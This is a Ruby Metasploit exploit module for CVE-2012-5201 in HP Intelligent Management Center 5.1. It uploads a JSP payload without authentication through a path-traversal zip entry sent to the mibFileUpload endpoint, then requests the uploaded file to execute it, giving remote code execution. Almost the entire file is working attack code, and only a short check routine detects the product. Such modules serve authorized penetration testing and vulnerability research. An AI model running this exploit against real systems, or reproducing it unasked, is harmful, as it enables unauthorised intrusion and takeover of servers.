##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HP Intelligent Management Center Arbitrary File Upload',
      'Description' => %q{
          This module exploits a code execution flaw in HP Intelligent Management Center.
        The vulnerability exists in the mibFileUpload which is accepting unauthenticated
        file uploads and handling zip contents in a insecure way. Combining both weaknesses
        a remote attacker can accomplish arbitrary file upload. This module has been tested
        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2012-5201' ],
          [ 'OSVDB', '91026' ],
          [ 'BID', '58385' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-050/' ],
          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03689276' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'win',
      'Arch' => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'HP Intelligent Management Center 5.1 E0202 / Windows', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 07 2013'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc'])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path.to_s, "login.jsf"),
      'method' => 'GET'
    })

    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    @peer = "#{rhost}:#{rport}"

    # New lines are handled on the vuln app and payload is corrupted
    jsp = payload.encoded.gsub(/\x0d\x0a/, "").gsub(/\x0a/, "")
    jsp_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"

    # Zipping with CM_STORE to avoid errors while zip decompressing
    # on the Java vulnerable application
    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("../../../../../../../ROOT/#{jsp_name}", jsp)

    post_data = Rex::MIME::Message.new
    post_data.add_part(zip.pack, "application/octet-stream", nil, "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{Rex::Text.rand_text_alpha(4+rand(4))}.zip\"")

    # Work around an incompatible MIME implementation
    data = post_data.to_s
    data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

    print_status("#{@peer} - Uploading the JSP payload...")
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path.to_s, "webdm", "mibbrowser", "mibFileUpload"),
      'method' => 'POST',
      'data'   => data,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' => "JSESSIONID=#{Rex::Text.rand_text_hex(32)}"
    })

    if res and res.code == 200 and res.body.empty?
      print_status("#{@peer} - JSP payload uploaded successfully")
      register_files_for_cleanup(jsp_name)
    else
      fail_with(Exploit::Failure::Unknown, "#{@peer} - JSP payload upload failed")
    end

    print_status("#{@peer} - Executing payload...")
    send_request_cgi({
      'uri'    => normalize_uri(jsp_name),
      'method' => 'GET'
    })

  end

end
